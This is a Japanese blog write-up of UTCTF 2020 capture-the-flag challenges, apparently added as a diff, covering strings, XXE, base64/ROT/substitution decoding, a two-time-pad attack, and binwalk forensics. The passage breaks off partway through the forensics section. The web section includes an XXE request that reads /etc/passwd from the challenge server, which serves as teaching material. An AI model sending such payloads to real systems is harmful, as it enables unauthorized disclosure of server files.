@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+		<title>UTCTF 2020 write up &middot; kuzushikiのぺーじ</title>
+		<link rel="canonical" href="https://kuzushiki.github.io/post/utctf2020/">
+		<link rel="stylesheet" type="text/css" href="https://kuzushiki.github.io/css/main.css" />
+		
+	</head>
+	<body>
+		<a id="title" href="https://kuzushiki.github.io/" title="kuzushikiのぺーじ">
+			
+				<img id="logo" alt="Logo" src="https://kuzushiki.github.io/images/logo.png" />
+			
+			
+				<h1>kuzushikiのぺーじ</h1>
+			
+		</a>
+		
+			<h4>セキュリティに関することを書きたいですね</h4>
+		
+		<div id="social">
+			
+			
+			
+			<a href="https://github.com/kuzushiki" title="Github">
+				<img alt="GitHub" height="64px" width="64px" src="https://kuzushiki.github.io/images/github.svg" />
+			</a>
+			
+			
+			
+			<a href="https://twitter.com/kuzu7shiki" title="Twitter">
+				<img alt="Twitter" height="64px" width="64px" src="https://kuzushiki.github.io/images/twitter.svg" />
+			</a>
+			
+			
+                        
+		</div>
+		<div class="links">
+			<a href="https://kuzushiki.github.io/">Home</a>
+			
+				<a href="https://kuzushiki.github.io/post/">Archive</a>
+			
+			
+				
+			
+				
+					<a href="https://kuzushiki.github.io/pages/resume/">Résumé</a>
+				
+			
+		</div>
+
+	<div class="postBody">
+		<div class="post">
+			<h1>UTCTF 2020 write up</h1>
+			<span class="post-meta">Mon, Mar 9, 2020 - Read in 8 Min</span>
+			<div class="content">
+			<nav id="TableOfContents">
+  <ul>
+    <li><a href="#basics-reverse-engineering-reverse-engineering-50pt">[basics] reverse engineering (Reverse Engineering, 50pt)</a></li>
+    <li><a href="#spooky-store-web-50pt">spooky store (Web, 50pt)</a></li>
+    <li><a href="#basics-crypto-cryptography-50pt">[basics] crypto (Cryptography, 50pt)</a></li>
+    <li><a href="#one-true-problem-cryptography-50pt">One True Problem (Cryptography, 50pt)</a></li>
+    <li><a href="#observe-closely-forensics-50pt">Observe Closely (Forensics, 50pt)</a></li>
+    <li><a href="#1-frame-per-minute-forensics-50pt">1 Frame per Minute (Forensics, 50pt)</a></li>
+    <li><a href="#basics-forensics-forensics-50pt">[basics] forensics (Forensics, 50pt)</a></li>
+    <li><a href="#spectre-forensics-50pt">Spectre (Forensics, 50pt)</a></li>
+    <li><a href="#sanity-check-misc-1pt">Sanity Check (Misc, 1pt)</a></li>
+    <li><a href="#感想">感想</a></li>
+  </ul>
+</nav>
+			<h1 id="utctf-2020に参加しました">UTCTF 2020に参加しました！</h1>
+<p>(team: team_Yamasan)</p>
+<p>某CTFをやってみよう会にて参加しました。</p>
+<p>自分は401点中301点を入れ、順位は329位 / 1001チーム(0点は除く)でした。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/76197716-04ff1680-6230-11ea-84a3-49720f0d4523.png" alt="FireShot Capture 018 - UTCTF - utctf live"></p>
+<p>write upを書いていきます</p>
+<h2 id="basics-reverse-engineering-reverse-engineering-50pt">[basics] reverse engineering (Reverse Engineering, 50pt)</h2>
+<p>問題ファイル: <code>calc</code></p>
+<p>ファイルの中身にフラグが含まれています。
+<code>strings</code>コマンドで確認しましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share# strings calc | grep utflag
+utflag<span style="color:#f92672">{</span>str1ngs_1s_y0ur_fr13nd<span style="color:#f92672">}</span>
+</code></pre></div><h2 id="spooky-store-web-50pt">spooky store (Web, 50pt)</h2>
+<p><a href="http://web1.utctf.live:5005/">問題ページ</a></p>
+<p>バミューダトライアングル、ピサの斜塔、ストーンヘンジの説明が書かれています。</p>
+<p><code>Check Nearest Location</code>と書かれたボタンを押すと、そのスポットの緯度経度をページ下部に表示します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">The nearest coordinates to you are: 43.7230° N, 10.3966° E
+</code></pre></div><p><code>Burp Suite</code>でリクエストを確認してみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">POST /location HTTP/1.1
+Host: web1.utctf.live:5005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://web1.utctf.live:5005/
+Content-Type: application/xml
+Origin: http://web1.utctf.live:5005
+Content-Length: 93
+Connection: close
+
+&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;&lt;locationCheck&gt;&lt;productId&gt;1&lt;/productId&gt;&lt;/locationCheck&gt;
+</code></pre></div><p>どうやらPOSTメソッドでXML形式のリクエストを送っているようです。</p>
+<p>XMLの脆弱性といえばXML External Entity(XXE)があります。</p>
+<p><a href="https://www.mbsd.jp/blog/20171130.html">ここ</a>を参考にしてXXEを用いた攻撃を試してみます。</p>
+<p>以下のようにリクエストを書き換えてから送ります。</p>
+<p>上手くいけば<code>/etc/passwd</code>の内容が表示されるはずです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">POST /location HTTP/1.1
+Host: web1.utctf.live:5005
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://web1.utctf.live:5005/
+Content-Type: application/xml
+Origin: http://web1.utctf.live:5005
+Content-Length: 93
+Connection: close
+
+&lt;!DOCTYPE name [
+&lt;!ENTITY h SYSTEM &#34;file:///etc/passwd&#34;&gt;  &lt;!-- &lt;D&gt; --&gt;
+]&gt;
+&lt;locationCheck&gt;&lt;productId&gt;1&amp;h;&lt;/productId&gt;&lt;/locationCheck&gt;
+</code></pre></div><p><img src="https://user-images.githubusercontent.com/50363796/76197829-3aa3ff80-6230-11ea-9625-bd8265a4d17c.PNG" alt="aa"></p>
+<p>やりました！！</p>
+<p>一番下にフラグが書かれていました。</p>
+<p><code>utflag{n3xt_y3ar_go1ng_bl1nd}</code></p>
+<h2 id="basics-crypto-cryptography-50pt">[basics] crypto (Cryptography, 50pt)</h2>
+<p>問題ファイル: <code>binary.txt</code></p>
+<p>ファイルの中身を確認してみます。（長いので一部のみ）</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-binary.txt" data-lang="binary.txt">01010101 01101000 00101101 01101111 01101000 00101100 00100000 01101100 01101111 01101111 01101011 01110011 00100000 01101100 01101001 01101011 01100101 00100000 01110111 01100101 00100000 01101000 01100001 01110110 01100101 00100000 01100001 01101110 01101111 01110100 01101000 01100101 01110010 00100000 01100010 01101100 01101111 01100011 01101011 00100000 01101111 01100110 00100000 01110100 01100101 01111000 01110100 00101100 00100000 01110111 01101001 ...
+</code></pre></div><p>2進数を文字コードとして、文字に置き換えてみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">binary.txt</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+data <span style="color:#f92672">=</span> map(<span style="color:#66d9ef">lambda</span> d: chr(int(d,<span style="color:#ae81ff">2</span>)), data<span style="color:#f92672">.</span>split())
+<span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(data))
+</code></pre></div><p>出力は以下の通りです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">Uh-oh, looks like we have another block of text, with some sort of special encoding. Can you figure out what this encoding is? (hint: if you look carefully, you&#39;ll notice that there only characters present are A-Z, a-z, 0-9, and sometimes / and +. See if you can find an encoding that looks like this one.)
+TmV3IGNoYWxsZW5nZSEgQ2FuIHlvdSBmaWd1cmUgb3V0IHdoYXQncyBnb2luZyBvbiBoZXJlPyBJdCBsb29rcyBsaWtlIHRoZSBsZXR0ZXJzIGFyZSBzaGlmdGVkIGJ5IHNvbWUgY29uc3RhbnQuIChoaW50OiB5b3UgbWlnaHQgd2FudCB0byBzdGFydCBsb29raW5nIHVwIFJvbWFuIHBlb3BsZSkuCmt2YnNxcmQsIGl5ZSdibyBrdnd5Y2QgZHJvYm8hIFh5ZyBweWIgZHJvIHBzeGt2IChreG4gd2tpbG8gZHJvIHJrYm5vY2QuLi4pIHprYmQ6IGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gU3ggZHJvIHB5dnZ5Z3N4cSBkb2hkLCBTJ2ZvIGRrdW94IHdpIHdvY2NrcW8ga3huIGJvenZrbW9uIG9mb2JpIGt2enJrbG9kc20gbXJrYmttZG9iIGdzZHIgayBteWJib2N6eXhub3htbyBkeSBrIG5zcHBvYm94ZCBtcmtia21kb2IgLSB1eHlneCBrYyBrIGNlbGNkc2RlZHN5eCBtc3pyb2IuIE1reCBpeWUgcHN4biBkcm8gcHN4a3YgcHZrcT8gcnN4ZDogR28gdXh5ZyBkcmtkIGRybyBwdmtxIHNjIHF5c3hxIGR5IGxvIHlwIGRybyBweWJ3a2QgZWRwdmtxey4uLn0gLSBncnNtciB3b2t4YyBkcmtkIHNwIGl5ZSBjb28gZHJrZCB6a2Rkb2J4LCBpeWUgdXh5ZyBncmtkIGRybyBteWJib2N6eXhub3htb2MgcHliIGUsIGQsIHAsIHYgaywga3huIHEga2JvLiBJeWUgbWt4IHpieWxrbHZpIGd5YnUgeWVkIGRybyBib3drc3hzeHEgbXJrYmttZG9iYyBsaSBib3p2a21zeHEgZHJvdyBreG4gc3hwb2Jic3hxIG15d3d5eCBneWJuYyBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4gS3h5ZHJvYiBxYm9rZCB3b2RyeW4gc2MgZHkgZWNvIHBib2Flb3htaSBreGt2aWNzYzogZ28gdXh5ZyBkcmtkICdvJyBjcnlnYyBleiB3eWNkIHlwZG94IHN4IGRybyBrdnpya2xvZCwgY3kgZHJrZCdjIHpieWxrbHZpIGRybyB3eWNkIG15d3d5eCBtcmtia21kb2Igc3ggZHJvIGRvaGQsIHB5dnZ5Z29uIGxpICdkJywga3huIGN5IHl4LiBZeG1vIGl5ZSB1eHlnIGsgcG9nIG1ya2JrbWRvYmMsIGl5ZSBta3ggc3hwb2IgZHJvIGJvY2QgeXAgZHJvIGd5Ym5jIGxrY29uIHl4IG15d3d5eCBneWJuYyBkcmtkIGNyeWcgZXogc3ggZHJvIE94cXZzY3Igdmt4cWVrcW8uCnJnaG54c2RmeXNkdGdodSEgcWdmIGlzYWsgY3RodHVpa2UgZGlrIHprbnRoaGt4IHJ4cWxkZ254c2xpcSByaXN5eWtobmsuIGlreGsgdHUgcyBjeXNuIGNneCBzeXkgcWdmeCBpc3hlIGtjY2d4ZHU6IGZkY3lzbntoMHZfZGk0ZHVfdmk0ZF90X3I0eXlfcnhxbGQwfS4gcWdmIHZ0eXkgY3RoZSBkaXNkIHMgeWdkIGdjIHJ4cWxkZ254c2xpcSB0dSBwZnVkIHpmdHlldGhuIGdjYyBkaXR1IHVneGQgZ2MgenN1dHIgYmhndnlrZW5rLCBzaGUgdGQgeGtzeXlxIHR1IGhnZCB1ZyB6c2Ugc2Nka3ggc3l5LiBpZ2xrIHFnZiBraHBncWtlIGRpayByaXN5eWtobmsh
+</code></pre></div><p>１文目のヒントにより、これは<code>base64</code>でエンコードされたデータだと分かります。</p>
+<p>デコードしてみましょう。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">binary.txt</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+    data <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+data <span style="color:#f92672">=</span> map(<span style="color:#66d9ef">lambda</span> d: chr(int(d,<span style="color:#ae81ff">2</span>)), data<span style="color:#f92672">.</span>split())
+b64data <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join(data)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+<span style="color:#66d9ef">print</span>(base64<span style="color:#f92672">.</span>b64decode(b64data)<span style="color:#f92672">.</span>decode(encoding<span style="color:#f92672">=</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>))
+</code></pre></div><p>出力は以下の通りです。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">New challenge! Can you figure out what&#39;s going on here? It looks like the letters are shifted by some constant. (hint: you might want to start looking up Roman people).
+kvbsqrd, iye&#39;bo kvwycd drobo! Xyg pyb dro psxkv (kxn wkilo dro rkbnocd...) zkbd: k celcdsdedsyx mszrob. Sx dro pyvvygsxq dohd, S&#39;fo dkuox wi wocckqo kxn bozvkmon ofobi kvzrklodsm mrkbkmdob gsdr k mybboczyxnoxmo dy k nsppoboxd mrkbkmdob - uxygx kc k celcdsdedsyx mszrob. Mkx iye psxn dro psxkv pvkq? rsxd: Go uxyg drkd dro pvkq sc qysxq dy lo yp dro pybwkd edpvkq{...} - grsmr wokxc drkd sp iye coo drkd zkddobx, iye uxyg grkd dro mybboczyxnoxmoc pyb e, d, p, v k, kxn q kbo. Iye mkx zbylklvi gybu yed dro bowksxsxq mrkbkmdobc li bozvkmsxq drow kxn sxpobbsxq mywwyx gybnc sx dro Oxqvscr vkxqekqo. Kxydrob qbokd wodryn sc dy eco pboaeoxmi kxkvicsc: go uxyg drkd &#39;o&#39; crygc ez wycd ypdox sx dro kvzrklod, cy drkd&#39;c zbylklvi dro wycd mywwyx mrkbkmdob sx dro dohd, pyvvygon li &#39;d&#39;, kxn cy yx. Yxmo iye uxyg k pog mrkbkmdobc, iye mkx sxpob dro bocd yp dro gybnc lkcon yx mywwyx gybnc drkd cryg ez sx dro Oxqvscr vkxqekqo.
+rghnxsdfysdtghu! qgf isak cthtuike dik zknthhkx rxqldgnxsliq risyykhnk. ikxk tu s cysn cgx syy qgfx isxe kccgxdu: fdcysn{h0v_di4du_vi4d_t_r4yy_rxqld0}. qgf vtyy cthe disd s ygd gc rxqldgnxsliq tu pfud zftyethn gcc ditu ugxd gc zsutr bhgvykenk, she td xksyyq tu hgd ug zse scdkx syy. iglk qgf khpgqke dik risyykhnk!
+</code></pre></div><p>１文目のヒントにより、これはROTで暗号化されたデータだと分かります。</p>
+<p>アルファベットが一文字毎に?文字後のアルファベットに置き換えられています。</p>
+<p>自然な文章になるまで1文字ずつずらします。</p>
+<p><a href="https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,16)&amp;input=a3Zic3FyZCwgaXllJ2JvIGt2d3ljZCBkcm9ibyEgWHlnIHB5YiBkcm8gcHN4a3YgKGt4biB3a2lsbyBkcm8gcmtibm9jZC4uLikgemtiZDogayBjZWxjZHNkZWRzeXggbXN6cm9iLiBTeCBkcm8gcHl2dnlnc3hxIGRvaGQsIFMnZm8gZGt1b3ggd2kgd29jY2txbyBreG4gYm96dmttb24gb2ZvYmkga3Z6cmtsb2RzbSBtcmtia21kb2IgZ3NkciBrIG15YmJvY3p5eG5veG1vIGR5IGsgbnNwcG9ib3hkIG1ya2JrbWRvYiAtIHV4eWd4IGtjIGsgY2VsY2RzZGVkc3l4IG1zenJvYi4gTWt4IGl5ZSBwc3huIGRybyBwc3hrdiBwdmtxPyByc3hkOiBHbyB1eHlnIGRya2QgZHJvIHB2a3Egc2MgcXlzeHEgZHkgbG8geXAgZHJvIHB5YndrZCBlZHB2a3F7Li4ufSAtIGdyc21yIHdva3hjIGRya2Qgc3AgaXllIGNvbyBkcmtkIHprZGRvYngsIGl5ZSB1eHlnIGdya2QgZHJvIG15YmJvY3p5eG5veG1vYyBweWIgZSwgZCwgcCwgdiBrLCBreG4gcSBrYm8uIEl5ZSBta3ggemJ5bGtsdmkgZ3lidSB5ZWQgZHJvIGJvd2tzeHN4cSBtcmtia21kb2JjIGxpIGJvenZrbXN4cSBkcm93IGt4biBzeHBvYmJzeHEgbXl3d3l4IGd5Ym5jIHN4IGRybyBPeHF2c2NyIHZreHFla3FvLiBLeHlkcm9iIHFib2tkIHdvZHJ5biBzYyBkeSBlY28gcGJvYWVveG1pIGt4a3ZpY3NjOiBnbyB1eHlnIGRya2QgJ28nIGNyeWdjIGV6IHd5Y2QgeXBkb3ggc3ggZHJvIGt2enJrbG9kLCBjeSBkcmtkJ2MgemJ5bGtsdmkgZHJvIHd5Y2QgbXl3d3l4IG1ya2JrbWRvYiBzeCBkcm8gZG9oZCwgcHl2dnlnb24gbGkgJ2QnLCBreG4gY3kgeXguIFl4bW8gaXllIHV4eWcgayBwb2cgbXJrYmttZG9iYywgaXllIG1reCBzeHBvYiBkcm8gYm9jZCB5cCBkcm8gZ3libmMgbGtjb24geXggbXl3d3l4IGd5Ym5jIGRya2QgY3J5ZyBleiBzeCBkcm8gT3hxdnNjciB2a3hxZWtxby4">ここ</a>で復号しました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">alright, you&#39;re almost there! Now for the final (and maybe the hardest...) part: a substitution cipher. In the following text, I&#39;ve taken my message and replaced every alphabetic character with a correspondence to a different character - known as a substitution cipher. Can you find the final flag? hint: We know that the flag is going to be of the format utflag{...} - which means that if you see that pattern, you know what the correspondences for u, t, f, l a, and g are. You can probably work out the remaining characters by replacing them and inferring common words in the English language. Another great method is to use frequency analysis: we know that &#39;e&#39; shows up most often in the alphabet, so that&#39;s probably the most common character in the text, followed by &#39;t&#39;, and so on. Once you know a few characters, you can infer the rest of the words based on common words that show up in the English language.
+hwxdnitvoitjwxk! gwv yiqa sjxjkyau tya padjxxan hngbtwdnibyg hyiooaxda. yana jk i soid swn ioo gwvn yinu asswntk: vtsoid{x0l_ty4tk_ly4t_j_h4oo_hngbt0}. gwv ljoo sjxu tyit i owt ws hngbtwdnibyg jk fvkt pvjoujxd wss tyjk kwnt ws pikjh rxwloauda, ixu jt naioog jk xwt kw piu istan ioo. ywba gwv axfwgau tya hyiooaxda!
+</code></pre></div><p>復号結果上部のヒントにより、これは単一換字暗号で暗号化されたデータだと分かります。</p>
+<p>英語の文章では&rsquo;e'という文字が最も使われているなど、文字の出現頻度を用いて解読（頻度解析）することができます。</p>
+<p>手動でやるのは面倒なので[このツール]に解かせました。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">congratulations! you have finished the beginner cryptography challenge. here is a flag for all your hard efforts: utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}. you will find that a lot of cryptography is just building off this sort of basic knowledge, and it really is not so bad after all. hope you enjoyed the challenge!
+</code></pre></div><p>フラグがありました！！</p>
+<p><code>utflag{n0w_th4ts_wh4t_i_c4ll_crypt0}</code></p>
+<h2 id="one-true-problem-cryptography-50pt">One True Problem (Cryptography, 50pt)</h2>
+<p>暗号鍵が同じである２つの暗号文が与えられます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">213c234c2322282057730b32492e720b35732b2124553d354c22352224237f1826283d7b0651
+3b3b463829225b3632630b542623767f39674431343b353435412223243b7f162028397a103e
+</code></pre></div><p>CTFの一番好きなカテゴリについての会話を暗号化したものだそう。</p>
+<p>問題名からワンタイムパッドを用いた暗号だと予想できます。</p>
+<p>暗号鍵と平文のXORをバイトごとに取り、その結果を16進数に変換していると考えられます。</p>
+<p>本来であれば鍵を知らないと絶対に解けませんが、CTFのカテゴリが平文に含まれることを利用して解いていきます。</p>
+<p>※実は同じような問題の<a href="https://kuzushiki.github.io/post/hackcon2019/#otp-crypto-100-pt">writeup</a>を書いてます。</p>
+<p>2つの平文を<code>m1, m2</code>、鍵を<code>k</code>とすると、暗号文はそれぞれ<code>m1 ^ k, m2 ^ k</code>になります。</p>
+<p>CTFカテゴリの文字列を<code>c</code>とすると、XORの性質から以下の関係が成り立ちます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">(m1 ^ k) ^ (m2 ^ k) ^c = m1 ^ m2 ^ (k ^ k) ^ c = m1 ^ m2 ^ c
+</code></pre></div><p>ここで<code>m1</code>か<code>m2</code>のいずれかに<code>c</code>と同じ文字列が含まれていれば、<code>m2</code>か<code>m1</code>を部分的に復号できます。</p>
+<p>プログラムを書いて試してみましょう！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+enc1 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>long_to_bytes(<span style="color:#ae81ff">0x213c234c2322282057730b32492e720b35732b2124553d354c22352224237f1826283d7b0651</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>)
+enc2 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>long_to_bytes(<span style="color:#ae81ff">0x3b3b463829225b3632630b542623767f39674431343b353435412223243b7f162028397a103e</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#75715e"># category, favoriteなどの文字列も含まれると予想</span>
+<span style="color:#75715e"># 大文字でないと上手く復号できませんでした</span>
+cat <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Cryptography</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Networking</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Binary Exploitation</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Reverse Engineering</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Web</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Forensics</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Misc</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Favorite</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper(), <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Category</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>upper()]
+
+<span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cat:
+    length <span style="color:#f92672">=</span> len(c)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(enc1) <span style="color:#f92672">-</span> length <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>):
+        dec <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+        <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> range(length):
+            dec <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(c[j]) <span style="color:#f92672">^</span> ord(enc1[i<span style="color:#f92672">+</span>j]) <span style="color:#f92672">^</span> ord(enc2[i<span style="color:#f92672">+</span>j]))
+        <span style="color:#66d9ef">print</span>(c, i, dec)
+</code></pre></div><p>出力のうち上手く復号できてそうな箇所をピックアップします。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">CRYPTOGRAPHY 25  EXPLOITATIO
+BINARY EXPLOITATION 19 RY IS CRYPTOGRAPHY!
+CATEGORY 13 NE IS BI
+</code></pre></div><p>平文が部分的に分かりました！</p>
+<pre><code>平文1:	*******************RY IS CRYPTOGRAPHY!
+平文2:	*************NE IS BINARY EXPLOITATION
+</code></pre><p>平文が分かれば対応する鍵の値も求められます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> Crypto.Util <span style="color:#f92672">import</span> number
+enc2 <span style="color:#f92672">=</span> number<span style="color:#f92672">.</span>long_to_bytes(<span style="color:#ae81ff">0x3b3b463829225b3632630b542623767f39674431343b353435412223243b7f162028397a103e</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">utf-8</span><span style="color:#e6db74">&#39;</span>)
+
+ans2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
+key <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">NE IS BINARY EXPLOITATION</span><span style="color:#e6db74">&#34;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">13</span><span style="color:#f92672">+</span>len(key)):
+    ans2 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> chr(ord(enc2[i]) <span style="color:#f92672">^</span> ord(key[i<span style="color:#f92672">-</span><span style="color:#ae81ff">13</span>]))
+<span style="color:#66d9ef">print</span>(ans2)
+</code></pre></div><p>以下の結果が得られました！！</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">m3_p4ds}utflag{tw0_tim3_p
+</code></pre></div><p><code>m3_p</code>の部分が一致しているので、フラグは<code>utflag{tw0_tim3_p4ds}</code>となります。</p>
+<h2 id="observe-closely-forensics-50pt">Observe Closely (Forensics, 50pt)</h2>
+<p>問題ファイル: <code>Griffith_Observatory.png</code></p>
+<p>画像ファイルは問題なく開けました。</p>
+<p><img src="https://user-images.githubusercontent.com/50363796/76197940-6de68e80-6230-11ea-824d-0b224fff1aa4.png" alt="Griffith_Observatory"></p>
+<p><code>binwalk</code>で怪しいファイルが潜んでないか確認します。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share# binwalk -e Griffith_Observatory.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+<span style="color:#ae81ff">0</span>             0x0             PNG image, <span style="color:#ae81ff">320</span> x 155, 8-bit/color RGBA, non-interlaced
+<span style="color:#ae81ff">41</span>            0x29            Zlib compressed data, default compression
+<span style="color:#ae81ff">127759</span>        0x1F30F         Zip archive data, at least v2.0 to extract, compressed size: 2587, uncompressed size: 16664, name: hidden_binary
+<span style="color:#ae81ff">130500</span>        0x1FDC4         End of Zip archive, footer length: <span style="color:#ae81ff">22</span>
+</code></pre></div><p><code>hidden_binary</code>というzipファイルが含まれていました！</p>
+<p>解凍して中身を見ていきます。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:/media/sf_share/_Griffith_Observatory.png.extracted/hidden_binary# ls -al
+total <span style="color:#ae81ff">30</span>
